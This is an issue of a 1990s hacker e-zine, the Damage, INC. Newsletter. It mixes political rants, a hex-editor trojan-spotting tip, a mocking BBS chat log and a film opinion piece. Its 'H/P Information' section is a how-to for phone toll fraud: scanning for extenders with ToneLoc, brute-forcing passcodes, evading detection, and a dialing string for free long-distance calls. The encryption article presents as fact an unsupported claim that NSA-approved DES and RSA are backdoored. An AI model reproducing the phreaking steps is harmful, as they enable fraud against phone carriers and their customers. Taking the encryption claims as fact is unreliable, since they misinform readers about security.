INTRODUCTION:  Greetings and salutations to our loyal readers.  Welcome to the
               second issue of the Damage, INC. Newsletter.  This issue includes
               more h/p information, interesting articles, an interrogation and
               the RAZORBACK trojan.  The contents has been changed to make it
               easier to read and use.  Personally, I think it's an improvement.
               There were so many articles written for this particular issue
               that we couldn't publish all of them.  That does not mean we
               aren't accepting new writers though, as we are always interested
               in articles that contain different opinions and ideas.  Also, if
               you program and want to support us... or contribute in some way,
               contact us.  To all of our readers:  Read, learn, experiment and
               explore with h/p.  Lastly, enjoy reading the newsletter and the
               information that is provided to you.  ;)


BIG BROTHER BASHING -                                         {BIG BROTHER}
Encryption and Big Brother's need for control.

Big Brother, the "spy in the sky" is watching.  Not only that, they are taking
control of encryption and taking away your right to privacy.  That's correct,
Big Bro will do anything in it's power to stop you from protecting your own
privacy.  Those that encrypt data (text and executable files) do so in an
attempt to keep that information private.  Is there any point in locking up
something if Big Brother already has the key?  No, of course not.  That would
be a complete waste of time, and you would only be giving yourself a false
sense of security.  Don't allow them to easily decrypt sensitive data and use
it against you as "evidence".  I've researched this topic very thoroughly, and
the lengths that Big Brother goes to in order to infiltrate the personal
information of citizens sickens me.

This article wasn't written to describe every type of encryption, nor was the
intent to teach you all all about how it works etc.  The purpose is to educate
you, by showing you that many types of encryption aren't safe.  Big Brother has
regulated and controlled encryption by setting standards.  Anyone that follows
those standards in programming encryption routines is just helping them by
leaving a backdoor wide open for Big Bro to use against you.  The NSA (National
Security Agency) in the United States is guilty of approving algorithms that
they don't trust or use for their own internal security.  DES and RSA were
approved by the NSA for public use, because they know it offers citizens very
little protection against the prying eyes of Big Bro.  You must take any and
all steps necessary in order to secure vital information and make sure it isn't
sitting in an unlocked safe.  Unless of course, you want it to be read, stolen,
distributed elsewhere etc.

Since many commercial encryption programs are a fucking joke, and follow the
government standards, I recommend that you avoid using them for anything.
If you really want to keep sensitive information protected, but don't know
much about encryption routines, program utilities etc. then download Vincrypt
or any other quality non-commercial encryption program.  Many of them are
available on my board at no ratio.  Here's a direct quote from the docs of
Vincrypt that describes what it is:

"Well, basically what Vincrypt is, and was designed to do is keep sensitive
information protected.  There have been many other programs that are out that
do along the same thing as Vincrypt, but not to the same degree.  Vincrypt
incorporates a modified DES routine, RSA public-key, MPJ encryption, and a
modified PKware zip based routine.  The most significant factor about this
program is the fact that it is a relatively 'dumb' program.  Aside from
identifying whether or not the source file was generated with the program, it
simply processes the files without any headers of pointers.  The reason for
this is to make it even more difficult to break the routine and bypass the
encryption due to file common information (such as how all government letters
say TO: FROM: DEPT:, etc)."

Also, you can use it on text and executable (COM, EXE) files.  If you want to
know more about encryption, find CRYPTFAQ.ZIP, download it and read through it
carefully.  There's a vast amount of information in that FAQ, therefore there
is no point in repeating it here.  In conclusion, Big Brother always seeks
control.  Even the author of Vincrypt mentions Orwell's book 1984 and can see
the similarities between the book and the present.  We live in very turbulent
and troublesome times.  Trusting the government is a trap that can turn into a
fatal mistake faster than you can say "Billy Gates".  He and his corrupt company
Micro$oft fit into the Big Brother category as well... since Windoze is setup
to invade privacy.  That's another article though.  ;)  Be aware, take measures
to protect sensitive data and information and don't just trust everyone.  If you
do, don't complain afterwards about your privacy being taken or invaded by
someone.  You are responsible for your own privacy, and can't rely on anyone
else to protect you from Big Brother.  I suggest that you take the first step by
getting Vincrypt or an equally good encryption program.  Then create your own
unique password and encrypt anything you have that might be classified as
incriminating evidence.


BLACKENED'S TIP OF THE MONTH -                                  {BLACKENED}
Detecting trojans using a hex editor:

Thanks to the suggestion Aenima wrote to me on FoI, we have a new section in
the Damage, INC. Newsletter.  ;)  Every month, I will share another h/p/a/c/v/t
related tip with readers.  It's up to you how the information I give out is
used.  Perhaps you'll get some ideas of your own and start thinking after
reading this section.  Yes, the first tip is about *detecting* trojans... and
we are trying to help people by providing them with reliable information.

First, you'll need to have a quality Hex Editor to use.  Load up TROJAN.COM
or TROJAN.EXE (or a file that you suspect to be a trojan) into a hex editor.
Second, look for MZ at the top as the first two characters if it's an EXE
file.  It should be there, even if the file has been Pklited.  That's just a
quick way to tell if the file is a legitimate EXE or not.  Next, look at the
first page on your screen.  Do you see the string "Not enough memory$" visible
anywhere?  If so, that is an indication that the EXE file has been Pklited.
Is there a string of "PKLITE Copr. 1990-92 PKWARE Inc. All Rights Reserved"
on the screen?  That's called a Pklite header.  It shows that the file has
been compressed.  However, that can be overwritten with data so that the
EXE file won't look like it's been Pklited.  If that string isn't there but
the "Not enough memory$" one is, the file has more than likely been Pklited
and then altered with a hex editor or by using a utility to remove the Pklite
header.  You can put the Pklite header back by using a hex editor, then you
can Pkunlite it (uncompress the file).  After that, you can disassemble it
using Sourcer or the disassembler of your choice.  If extra compression was
used to Pklite the file, you'll need a special Pkunlite utility.  Of course,
it's available to download from AJFA at no ratio.

You can also use your hex editor to look for other strings, such as *.COM,
*.EXE, *.*, Borland etc. by doing text searches.  If you see words such as
"nuked" or any other suspicious text... then send a copy of the file to a
member of Damage, INC. and we'll test it for you and determine exactly what
it is.  As a free service, we do virus/trojan research for respected users in
the hacking/phreaking scene.  We will report our findings to the user that
sends us the file(s) that they don't trust.  In fact, we will even disassemble
the file(s) and give you a copy of the source code if you request it.

Recently, it's become popular to use a small utility called Mini-Chainer to
link trojans to legitimate COM and EXE files.  Here's a quick and easy way
to find them.  Load the file up into a hex editor.  Look at the second line
on the first page.  If the word "FUCK" is written there, then that basically
means someone used Mini-Chainer to link one file to another.  That doesn't
necessarily mean it's a trojan, although it's possible since a lot of people
around here use that method to attach trojans to other files.  I hope you find
these tips useful for detecting trojans (that are undetectable to the majority
of virus scanners, including heuristics).  Of course, there are also more
complex ways that you can use a hex editor to detect trojans.  Another tip is
to check the end of the file, and simply compare it to another EXE file that
you know is legit.  There are other reliable, more complicated methods as well.
I'll leave disassembly tips for another issue though.  ;)


CONSPIRACIES AND COVERUPS -                                      {COVERUPS}
THE WAR AGAINST UNIONS

Big business and the governments in North America are doing all that they
can to weaken unions.  Twenty years ago, approximately 21 percent of the
private workforce were members of a union.  That has dropped down to a mere
10 percent.  As many businesses report record profit levels, the wages and
benefits for the working class have been stagnated for the past twenty
years.  "Big business" is profiting immensely from the recession of the
early 1990s when the working class was victimized by layoffs, job migration,
and "downsizing".  Even as the world's economy gains strength, particularly
in the United States, workers are not seeing any of the benefits.

For the most part, the record corporate profits have been made off of the
backs of workers, not on superior products or good management.  It is
cheaper for businesses to have several part-time employees instead of one
full-time employee.  With no real job security, no benefits, no guarantee
for stable hours, and minimum wages, it is extremely difficult for part-time
workers to earn a decent living.  In contrast to part-time employees, most
full-time employees earn higher wages, have a benefit package, stable hours
and more job security with seniority based upon their hiring date.

The proliferation of these part-time positions is one of the issues that
the Teamsters Union fought in the recent UPS strike.  They were successful
in forcing UPS to maintain all current full-time positions.  The Teamsters
Union also fought for stable hours for UPS's part-time employees.  One lie
that the government and big business spread during the UPS strike was "all
part-time employees want to work part-time!"  There are millions of workers
throughout North America that do not agree with that statement.  CNN
interviewed several striking UPS employees.  Many were working part-time
for years, and admitted that they badly wanted and needed full-time positions.
UPS promised these employees full-time jobs eventually... but "eventually"
never came for them.  Thankfully, UPS was stopped in its quest to make even
more money off of the backs of their employees.  Unfortunately, union members
must be vigilant, because thousands of other companies are looking to maximize
profits at any cost.

Another tactic that fat cat corporations love to use is to employ temporary
workers in a continuous cycle.  Temporary workers are not their employees,
and therefore have no link to the company.  These workers aren't treated
like human beings, but like a tool that is used and then disposed of when
it is no longer needed.  Temporary workers also have to live with the fact
that they are only making a portion of what the company is paying for their
services.  Being an employee of a temporary agency is a sickening experience.
If it weren't for labour unions, all members of the working class would be
treated the same way that non-unionized temporary workers are today.

Unions are now in a fight for survival.  In July, the government of Ontario
proposed a law to take away the right to strike from municipal, education,
hospital, and other public workers.  The public unions retaliated by
threatening to initiate province wide walkouts.  Premier Mike Harris, afraid
that the public would hold him responsible for the potential walkout, backed
down.  He then promised to "restore the right to strike" in an amendment.
Harris then changed his tactics.  Instead of attacking all public sector
workers, he seems to be attacking one faction at a time.  Former Education
Minister John Snoblen, one of Harris' puppets, announced that would make the
school year longer, and that he wants to strip the right to strike from
teachers.  He also wants to eliminate up to 10,000 jobs in addition to cutting
$1 billion from Ontario's education system.  In order to protect their union
and maintain their rights, the teachers have initiated an "illegal" strike.
Instead of negotiating with their employees in good faith, the government is
attempting to take any kind of leverage or strength away from the public
worker's union.  And whatever the government does to help themselves in their
own labour problems eventually helps greedy "big business" as well.

It is sickening how many people have adopted a negative view towards unions.
They focus more on negative scandals, instead of the benefits that labour unions
have obtained for its members.  When the name Jimmy Hoffa, the former Teamsters
Union President, is mentioned, he is remembered more for being convicted of
jury tampering and misappropriation of union funds.  Meanwhile, he was
responsible for signing the first U.S. contract with trucking companies, giving
truckers more job security and better working conditions.  Another example is
very recent.  Teamsters president Ron Carey was responsible for the union's
victory over UPS.  However, it has come to light that his campaign managers
misappropriated union funds in order to finance his successful run at the
presidency of the union.  In my personal opinion, unions are too important to
be destroyed by the greed of some of the union's executives.  The fact remains
that without unions, all the people that consider themselves to be in the
working class would be at the mercy of upper management.  One employee who
stands up for better working conditions and pay is the next employee to be
fired.  It takes all the employees united together in order to get their CEO's
attention.

There is a conspiracy to destroy unions, not only in Ontario but in the rest
of North America.  The government always sides with big business whenever
there's a dispute or large scale strike.  Plus, big business has more power
and influence in government than most citizens realize.  They stick together
in their goal to enslave the working class, remove our rights, benefits,
job security and keep wages low.  The auto industry is a perfect example of
how the large companies make sure the UAW (United Auto Workers) isn't given
too much in contract negotiations.  They protect each other.  It's time for
the working class to unite and fight back.  Fight fire with fire.


CORRUPTION AND GREED -                                              {GREED}
Bell TotalVision...the start of a total monopoly.

The media has recently been releasing a lot of reports and articles on Bell.
I've personally been keeping a close eye on that company, and feel they are
on the verge of a total monopoly.  As in, a monopoly comparable to the
magnitude of Micro$oft and its control of the software industry.  I will
explain in further detail by quoting from an article that I read recently,
and paraphrasing from a Quebec television program.

The headline reads "Bell Canada rolls out TV cable trial in London, Ont."
That's right, Bell is doing market trials in London, Ont. and Repentigny, Que.
It's their first step towards a total monopoly on the telephone, TV and
Internet service industries.  The Canadian Press article starts off by saying
"Ma Bell has fired a shot over the bow of the cable television industry,
rolling out big-gun interactive technology in a fight to win the hearts and
wallets of viewers."  The wallet comment is pure truth.  That is always the
goal of Bell Canada, and has been since the inception of that corrupt, greedy
organization.

Is Bell really seeking a total monopoly?  Here's another quote:  "The outcome
could see a single company look after all the communication and entertainment
needs of a subscriber - phone, interactive TV and high-speed Internet."  That
should clarify their motives a little.  Terry Jarman, Bell's group vice-
president for business development was quoted as saying "TotalVision is a first
for Bell and for our customers."  That's a very obvious statement, since this
is the first attempt by Bell to dominate three different industries and gain
a total monopoly.  TotalVision=Total Monopoly.  That equation shouldn't be too
difficult for our readers to understand.

Jarman also said that consumers will be the big winners and that "TotalVision
is ushering in a whole new level of programming choice and quality."  Quality?
That must be questioned by us as consumers.  Judging by Bell's past inferior
quality and service in the telephone industry, TotalVision will be Total Shit.

According to the article, there will be a package that starts at $19.95 a
month for 26 channels of programming that's already available locally on
Rogers Cablesystems.  I'm not defending Rogers by any means, just giving you
the necessary information on cost etc.  The $19.95 is what Bell claims their
TotalVision will start at, but of course that can easily change without notice.
Also, that is the most basic package, nothing more than normal cable TV in my
opinion.  The article goes on to say "Subscribers will be able to build their
own TV menu by adding themed bundles of channels - such as news and sports -
plus specialty stations to the basic offering."  Again, Rogers offers a very
similar "specialty station" and "Cable plus" type of service.  Therefore,
Bell isn't revolutionizing anything by being innovative and creative.

Jarman also said that "TotalVision promises sharper picture and better sound
quality through digital technology."  It also comes with an interactive program
guide, an on-screen device that "transforms regular channel surfing into a
high-tech art" according to the Canadian Press.  Haha.  It has station lock-out
capabilities (many TV devices offer that already) and a what's-on-right-now
feature.  "With a hand-held converter, viewers can select a week's worth of
viewing by subject, title or channel."  "The converter can also remind a viewer
when a favorite program is about to start."  Those features might sound nice,
but don't be influenced into thinking they were difficult to implement.  Here
is the best part, "Bell customers also will be offered high-speed Internet
access, either through a personal computer or the television."  Man, Bell sure
is getting into the cable TV and Internet service market quickly.  They must
have realized how much cash is involved, and want to grab as much of the market
as they can.

Jarman also said that "more choices - not anti-cable industry sentiment - will
be the biggest motivator for people in the test area to switch to Bell."
Why didn't he just speak the truth, and say that influence, propaganda,
ignorance and naiveness by Bell customers are the biggest factors.  The zombies
want to support Bell, remain loyal to them, and help them build a gigantic
monopoly.  The government, politicians etc. are already trying to tell people
to switch to Bell.  And I quote London Mayor Dianne Haskett "the initiative
will help keep the city in the forefront of technological change."  That's a
direct attempt by the mayor to influence the citizens of London to try
TotalVision and give Bell money.  They are expecting as many as 1,500
subscribers signed up by the end of this year in London, about 3,500 households
in both London and Repentigny, before they expand and try to reach millions of
other TV subscribers across the country.  Bell's plans for a total monopoly are
crystal clear as far as I'm concerned.  Owning a monopoly on local telephone
service isn't enough for those greedy Bell bastards.  They want "TotalControl",
which is what TotalVision equates to being.  I can't even imagine the poor
customer service you'd receive, when you encounter problems with cable or
internet usage.  If it's anything like their current "customer service" then
the word poor won't begin to describe it.  In summary, watch out for
TotalVision.  If it's offered in your area, do some research first before
switching and paying the price.  Bell will use every marketing tactic, and every
trick in the book (including underhanded payoffs, undercutting the competition
for a couple of months etc.) to urge you, sway you and ultimately influence you
into switching to Bell TotalVision.  Don't be fooled like a zombie.  Make an
intelligent, informed choice.  Don't base your decision on their expected,
upcoming commercials and other advertising but rather on facts and real
information.


H/P INFORMATION AND NEWS -                                           {NEWS}

If the thought of using an extender, or the mention of the word itself makes
you shudder in fear then quit reading now.  The information discussed in this
section is for informational purposes only.  If and how you use it is your own
choice, and we aren't responsible for any consequences that might result.

Extenders are mainly used to call ld for free.  Some extenders divert, but
not all of them do.  There are several quick and easy ways to find that out.
For example, if you're using 651-2252 to call Guelph from K-W... you can dial
an ANI.  If it reports your phone number, then it doesn't divert.  Or, if you
don't have an ANI... try calling a friend that has Caller ID and ask them what
phone number is displayed.  If you don't know anyone that has Caller ID and
are desperate to know if it diverts, call a friend and ask them to hang up and
type *69 to find out the number of the last caller.

In order to find extenders, you'll need to use a good scanner such as ToneLoc.
Download a copy of ToneLoc from a local h/p board, read the docs and take time
to set it up properly etc.  Start scanning some exchanges in your local area.
Make sure you log everything.  You'll soon discover that there are quite a few
tones and carriers around that you never knew existed.  (Examples:  651-2252,
651-2255, 895-2255, 846-2255 etc.)  Don't scan at night because you'll awaken
people.  Use *67 in the dialing prefix as a small precaution.  Be aware of
what you're doing and careful not to call certain numbers that will end up
getting you caught.  If you use ToneLoc, you can create a list of numbers that
should never be dialed while scanning.  There are also several features that
you can use for making notes of tones, carriers, VMBs etc.

Once you've found an extender or two, and realize that there is a passcode
(usually 4+ digits)... don't despair or give up immediately.  That simply
means it will have to be hacked.  First, you have to determine how many digits
the passcode is.  Try calling it voice (using your phone) and listening to
the recorded message... Experiment by entering in a few digits and gauge the
amount of time you are given for that task.  There are things that can't be
taught in a text file, such as intuition, resourcefulness, skill, experience
and intelligence.  ;)

ToneLoc can be used to scan and hack PBXs, extenders etc. or you can use any
scanner that you prefer.  There are also ways to use Telix scripts etc. for
this purpose.  Hacking is much more than just reading how to do something,
learning one technique or using a scanner.  It is thinking and learning on
your own.  Therefore, these are just the basics to get newbies started.

Okay, so you've found an extender and believe it has a 4 digit passcode.  Now
what?  You can manually try to "guess" default type passcodes if you want.
However, that isn't the most efficient way for obvious reason.  A 4 digit
passcode means it is between 0000-9999.  That's the range of possible choices.
That does not mean that you should try every combination.  Haha!  If it's a PBX
and not an extender, hack after business hours during the night (when most
offices are closed)...ToneLoc can be used to hack extenders, diverters, PBXs,
VMBs and just about any other code.  In fact, there are people scanning and
hacking codes in 519 all the time.  Try to stick to the 4 digit ones, and use
a diverter whenever possible.  I'll discuss PBXs and VMBs in a future issue.
Also, don't scan sequentially... or dial the same numbers day after day etc.
If you have access to a remote system with a modem, then I'm sure you can figure
out a way to safely use that for scanning and hacking codes.

Now that you've found a passcode for the extender, you'll need to use a dialing
string in Telix (or the terminal program you use) like this example:

atdt 8952255,,,,####,,,,,8218486

The first number is the extender.  The commas ",,,," are pauses.  The #### is
the passcode.  Then there are more pauses and the number of a board or whatever
you want to call.  In the above example, I used distraught continuum which is a
BBS in Guelph.  You will have to experiment and try different amounts of pauses
for virtually every extender that you find.  As in, there are different lengths
of messages etc.  Some extenders require you to enter a client number first,
then pauses, then the passcode, then more pauses and finally the number that
you want to dial.  If that sounds too difficult or complex, then you might as
well forget about using extenders altogether.


úúúÄÄÄ H/P NEWS ÄÄÄúúú

A 14 year old hacker in Burlington was caught hacking an estimated 500 internet
sites, military sites etc.  He was recently busted at his home.  There weren't
many details reported about the case, since he is a minor and the cops can't
release his information.  They also wouldn't disclose how he was caught or why
he was able to hack that many sites before being caught.

Recently, the h/p scene has improved somewhat.  There's still a long way to
go though as many users still aren't educated and misunderstand what it is
about.  I'd like to give credit to the newbies that *are* learning.  People
such as Blade Runner have begun to read, experiment, learn and put that
knowledge into practice.  I can see potential in him, and hope that he
continues to mature and evolve as well as become more involved.  ;)  In fact,
I might start accepting new users on my board again, to reward people that
are actually trying things and becoming dedicated.  There might even be a new
h/p board online in 519 soon.  Perhaps the local scene is starting to change.

Chicago...Chicago... the city of Capone.  Killing people in the streets...with
a heart of stone.
Chicago...Chicago... the city of Capone.  Death is lurking everywhere...welcome
to the crime zone.

Please allow me to introduce myself, my alias is Blackie Lawless.  I am a
proud member of Damage, INC. and have been in the h/p scene for many years.
I'll be writing about any h/p news in my area that is worth reporting.  Since
I just moved to Chicago recently, I'm still becoming acquainted with the local
h/p scene.  I must say, I like the concept of the Damage, INC. Newsletter
though and I'm looking forward to contributing more in future issues.


INTERVIEWS AND INTERROGATIONS -                                {INTERVIEWS}

Below is Lordicon's reply to my New User Application message on Discrete and
Elite.  He laughs and tries to mock Damage, INC.  That is what prompted me to
interrogate him.  I was very sarcastic with some of my comments and didn't
answer any of his questions truthfully.  Also, you'll notice that he likes
to use the phrase "lemme guess" and calls h/p "old and lame" several times.
This interrogation of Lordicon should show you how lamers talk and act.  As
you'll see, he knows nothing about h/p.

Hey.. how's it going?  -B

fine :)  ya, ok, I have lotz of homework 2 do so I gotta be quick ok...  -L

okay.  You have lots of homework already?  -B

of course...I goto a private skool :(  :) heh heh, ya we gotta wear a uniform 
(expensive) but it's comfortable  -L

What school do you go to?  -B

SJK (st john's kilmarnock) a little skool out by maryhill between gwelf and   
kW...ok, anywayz...assembly...why sort r we talking about like 6502 assembly  
or like 8386 or whatever?  -L

8086/88.  I was just wondering, why did you call your board discrete and elite?
Does it have warez?  -B

some, it's more of a name...u know, like Alien Horizons is just a name, it's  
not really some horizon with alien's on it...heh heh...mainly a cool rhyming  
name...ok but assembler!!!! :)  -L

Okay, I know how to program in assembly.  I'm new to calling Guelph boards,
so I don't know what Alien Horizons is all about.  Anyways, why were you
saying before that you hate hacking/phreaking?  -B

old and lame...people who are NEW to it think it's cool...all hacking is      
really if finding someone's PW cuz they made it easy to crack...more luck     
than skill in hacking and preaking is also lame, none of the like red or blue 
or other boxes really work...only thing that works is physically SPLICING the 
cables... it's just lame, and lame to see ppl with no experience saying...OH  
IT'S SOOO COOL... :)  Can u UL me an assembly manual and an assembler?  -L

Yeah, sure man.. right after we chat.  I'm new to this and you're teaching me
some things and giving me good information.  What do you know about           
carding/anarchy?  -B

I know that anarchy was origionally an antigovernment movement in europe that 
-- where some asshole decided to use bombs to highlight his opinions...so all 
use stupid idiots in canada and the US think that anarchy is breaking pop     
machines and blowing stuff up...YA RITE!...anywayz, carding is practically    
impossible unless u, again, PHYSICALLY get a card under some fake accound and 
like over draw on the account...see, it's not anything cool it's just luck!  -L

Okay.  Is Freedom of Information Archives a good source of information for
that type of stuff?  -B

ya, if u like it...I guess, I DL'd a whole ton of that stuff when I used to   
think it was cool...too bad it was about 8 year or so out of date...and       
besides, things like the black box OBVIOUSLY don't work...it's just cutting   
up a fone and sticking a light on one of the wires...and the guy who wrote    
the file says it makes the bell computers think ur still ringing and havn't   
picked up yet...oh well...  -L

Do you still call FoI?  -B

nope...no point...I don't like the stuff...I'm into games...way more fun and  
diverse than "hacking"  -L

Okay, I read somewhere that you were deleted from there.  ;)  -B

ya, the sysop kicked me off (I was his cosysop) and I implimented a cool lite 
bar menu system for all the mojor menu's on the board...so like on the main   
menu u press up and down and left and right to move a cursor around and hit   
space when the cursor is on the desired item and then it takes u to that      
menu...
btw, I may have to brake out of the conversation for a time if my parents     
come it so like, if I just stop typing for a while just hang  -L

Okay, no problem man.  So, why do you think Damage, INC. is lame though?  Do  
you think I should stop being a member?  -B

just had to brake out then,.,glad i told u :)  I don't think DI is lame       
anymore, I thought it was some hacking/phreaking/anarchy thing (damage        
 --the word damage suggests that)  -L

Well, Damage, INC. does deal in h/p.  ;)  -B

lemme guess, u figure out cracks and stuff to get into things...well, if it's 
a crack for a good game or prog that's GREAT but if it's to hack some guys    
hard drive with a trojan or something that's lame!  -L

What about hacking extenders/PBXs etc.?  -B

u can get caught easily on those...besides, it's better to just get the net   
and use things like netfone...u can actually use a special PC card that       
plugs into the fone and let's u call a person over the net voice...cool eh..
I could call u over the net and I'm pretty sure u don't even need to be on    
the net...it just calls or somthing...and it's free (cept for the 150 bucks   
or so for the card) ...btw, the Web is the most boring thing now, damn that   
netscape, making it all graphical and stuff...the old superfast text based    
thing was cool...like a giant bbs!  -L

Yeah, what do you think about calling ld for free?  -B

lemme guess, biege boxing...too dangerous and too unrelaible...I don't have   
anyone to call anywayz since I use ICQ over the net (not the web the          
internet...that's 2 different things) ICQ is a real time chat prog that let's 
u send files, chat and send msgs and other things with lots of people at the  
same time so I just chat with my friends in KW for free over that and send    
files too...  -L

What about hacking ISPs and using the internet for free?  -B

I just too my skool's net info and duplicated on my comp...that's how I log   
in.  -L

What languages do you know how to program in?  -B

QuickBasic 4.0      Turing 7.05A       VERY LITTLE Turbo Pascal     and I'm   
learning Borland C++ 5 from one of the FOR DUMMIES books  -L

Haha... Have you ever tried to program a virus/trojan?  -B

again, LAME...WHY?  I don't WANT access to anyones HD and viruses are lame    
and stupid...I don't like destroying or ruining things  -L

Okay, so you don't have anything like that on your board then?  -B

HELL NO...I've nearly got my entire 2.1 gig HD full of all kinds of cool      
games and stuff...i don'
t want it deleted by accidentally releasing a virus on myself!!!!!!  GEEZ!  -L

Haha.  ;)  Alright, so can I get access to your warez?  -B

it costs 5 bucks a month (much cheaper than any other board I've seen) and u  
get everything...all the files, tons more options and stuff...plus access to  
any tournaments I may have in games...plus all the new ONLINE GAMEs I get  -L

Would I have no ratio access if I sent in $5?  -B

ya... ...ya that's what it is...no ratio...u can DL as much as u want...plus  
ud get 3 hours a day  -L

Yeah.  That's *very* reasonable, but I'm not into warez.  ;)  -B

Heh heh...web warez suck...they never DL properly because of all the          
congestion...RRRRRRRRRRr  -L

I don't play any games.  I mainly program...  -B

ya, program any games?  -L
or just apps ?  -L

I program utilities, trojans, viruses etc.  ;)  -B

what about like, COOL stuff...things that EVERYONE can enjoy...games, DECENT  
utils that like can HELP you...etc...I'm not into virus stuff...infact, don't 
bother Uploading that assembler now, I'm afraid u'll put a virus in it.  -L

I wouldn't do that.  As for useful utilities, I've programmed many.  Check    
out the Damage, INC. Utilities sometime.  They can be used by everyone.  -B

examples?  -L

Let's see, we've released a utility that can nuke files permanently.  -B

wow, I've seen that already...so basically it doesn't put that invisible tag  
on the file that allows it to be written over, it just kills the file right   
away?  -L

No, that isn't how it works.  We've also programmed a utility called          
HideDrive that can be used to hide hard drives.  We've -B[LORDICON interrupted]

how about on that can password a directory...that would be nice...  -L

AND make it undeletable unless u know the PW?  -L

Yeah, I could create a utility like that.  We've also programmed a utility
to rename subdirectories and one to nuke subdirectories/trees.  -B

ok, DELTREE for dos does that and also, windows 95 can rename sub dirs        
anywayz...I want something that puts PWs on directories in win and dos so     
it's inaccessable from anywhere...AND make it so u can't remove the dir       
unless u have the PW  -L

You said before that you wouldn't trust files that I upload.  -B

ok, I trust u now :)  I just HATE viruses...  -L

Yeah, we've made quite a few utilities.  You'll have to read the Damage, INC.
Utilities User Manual sometime...  -B

ok, whatever...u have a beginners manual for asm?  Like one that will start   
at the start...like, this is how assembly works and stuff...basically all I   
know it that assembly works almost like the CPU itself, sending info to       
memory addresses and calculating it there...can u do graphics with ASM?  -L

Yes.  You sound like you've mastered assembly already.  ;)  I'll look for the 
manual and upload it the next time I call.  -B

ok...and PLEASE, don't infect it!!!!  -L

Why would you assume that I'd do something like that?  -B

cuz once some asshole ULed a prog saying it was PKZIP (some newer version)    
(this was on my old 386 and I have no virus scan) ...I'd chatted once with    
him and we were just jokin and stuff, like I didn't tell him off or yell at   
him or get him mad and the next thing he does it UL this prog saying it was   
self extracting and it was really some shit exe prog (easily made in ANY      
language, ie: DEL *.*) and it nuked half my HD...>:O  -L

What was their alias?  -B

I dunno, but it was common...I saw someone with the same name on another      
board but it was the wrong guy...  -L

Haha.. shYueahtup!!! >:)  [interrupted by LORDICON again] -B

So, who draws the ansi for your board?  -B

me
...I use a3e...I feel that a sysop has lost his/her own personal touch of the 
board...
sorry I had to brake for a sec :) ...u know what I mean, once they don't do   
the ansis they don't own the board anymore.  -L

Yeah, I know what you mean.  Do you have a Co-Sysop though?  -B

about 3...Rebel being my MAIN co who actually calls...the other 3 actually    
being a friend of mine, my bro and another friend that donated a 4x4 cdrom    
(4 disks. 4 spin)  -L

That's cool.  Do they all help with the board?  -B

well, mainly reble...my bro is co by default and the other 2 barley ever call 
cuz one has his own board and the other (who donated the 4x4 drive) is LD  -L

How many hard drives do you have?  -B

1...a 2.1 gig...I want to get an 8 gig...  -L

Did you just get a new system?  -B

about ...nearly a year ago...a very nice p200 MMX...top of the line back when 
I got it...32 meg ram um, 15 inch monitor and a SB-AWE 32...and 8x cdrom  -L

How'd you afford to buy that?  -B

my parents did...I'm only 16...  -L

Haha.  Okay, anyways, I'm busy and have to go do something.  So, I'll call    
tomorrow.
Later [LORDICON started fucking around again] -B

heh heh sorry, ok laters...btw, check out the files...I have MP3s and video   
game emulators and roms...  -L

Okay.  I'll check it out tomorrow.  -B

ya, okie...I got that HW to finish anywayz...btw how old be u  -L

I'm 32  -B

HAHAHAHA...and ur into hacking and stuff...NERD! :) 
sorry :) it's just so KIDDISH to be into hacking and stuff...asembly is cool
tho...  -L

Yeah, that's how I make money... Anyways, I'll chat with ya later.  -B

c ya...ok...bye  -L

I received these messages on Freedom of Information Archives, and decided to
save my replies for this section of the Damage, INC. Newsletter.  Send us
feedback.  We'll try to publish the majority of the readable, quality letters.

B> you want to say about the newsletter.. and I will reply to some letters in
B> the next issue.  ;)

feedback eh. hmm, well i for one thought it was well laid out easy to read,
very informative <not to much along the h/p lines yet> when i say well laid
out i mean like easy to follow
e.g

when you an the journalist were chatting after he or you were done you would
say -TJ or -B  very usefull also i like that method with the NWO trojan its
efective and a GOOD method. you like 40 hex?

now some bad things i found i did not really like the table of contents
PERSOANLY i feel they should be a little neater.

thats all i have to say other than that LITTLE thing it was very informative

i'll never eat at burger king again :)
--------------------------------------------------------------------------------

Editor - Thanks for the feedback man.  We always appreciate comments and
         helpful suggestions.  As for the interview, the -B and -TJ identifiers
         were added afterwards to make it easier for readers to follow.  We've
         included more h/p information in this issue, and plan to gradually
         increase that aspect of the Damage, INC. Newsletter.

         I have respect for Phalcon/Skism and used to read 40 Hex magazine
         regularly.  That's why I decided to use the debug script method,
         since it's very safe and effective.

         The contents has been changed in the issue.  We hope the readers find
         the new format neater and easier to use.  You suggested that I add
         a section called "BLACKENED's Tip of the Month" and that has been
         included in this issue.  Thanks again for that insightful suggestion.

         I'm glad you found the first issue to be informative.  As for Burger
         King, my intention was to write an article that would have an impact
         on anyone that read it.  Your comment about never eating there again
         confirms that I was successful in informing at least one reader.  ;)


OBJECTIVE OPINIONS -                                             {OPINIONS}
    ---/ Hacking and Hollywood /---

    Like almost everything in this world, Hacking/Phreaking has received
its share of media attention.  This is expected, as nothing escapes the
watchful eye of the paparazzi.  Whenever Hollywood takes an interest,
and decides to publicize events/facts in a totally distorted view, I get a
little pissed off.
    I'm not talking about real events like the Internet wormhole virus, but
fictional material that portrays hacking in a certain view.  Let's take the
movie "Hackers" for example.  I'm sure anyone reading this has seen it just
out of curiosity.  For those of you lucky enough to be warned by a fellow
h/p'er not to see it, I will recap the general theme.  In the film, hacking
is glamourized; to no end.  In this movie its the hackers who get the chicks,
not the jocks.  Hahaha, now that's realism for ya ;).  Granted, the film is
set in the future, but unfortunately the producers decided to show techniques
that have been used by hackers for years.  So first of all, the first
incongruency that comes to my attention is that they give the impression hackers
are a malicious bunch of rebels, using the same technique to accomplish their
means.  Despite the true reality, which is that hacking constantly changes, and
is being updated.  Otherwise it wouldn't be hacking.  I think in the movie,
they even have the audacity to show someone using a bluebox.  I could be
wrong, but crap like this just represents hackers as idiots.  It appalls me.
Another aspect of the "Hackers" movie was the hang-out spot used by the
main characters.  This is essentially a "Boogie's Diner" (bad show) with
some neon lights and music.  And don't forget the inline skaters, hehe.
They are portraying hacking as a social activity, something that you do
around dinner, which is hilarious.  I think if they made a true hacker
movie it would either be really boring, or fucking amazing.  That's how it
is when you live the lifestyle.  When you eat, breathe, sleep h/p you
spend hours in a trance playing around with numerous different variables,
twiddling obscure configs and hoping it works.  H/P has its exciting
moments, and its boring moments.   Hollywood cannot understand this.
    Another, and perhaps not quite so bad h/p flick is "The Net" with Sandra
Bullock.  The producers managed to come up with some unique ideas
surrounding viruses/cryptology/hp etc.  It was still too Hollywood though,
with the standard movie "template" - good guy, bad guy, conflict, a chase,
romance, happy ending.  You know what I mean... far too predictable ;)
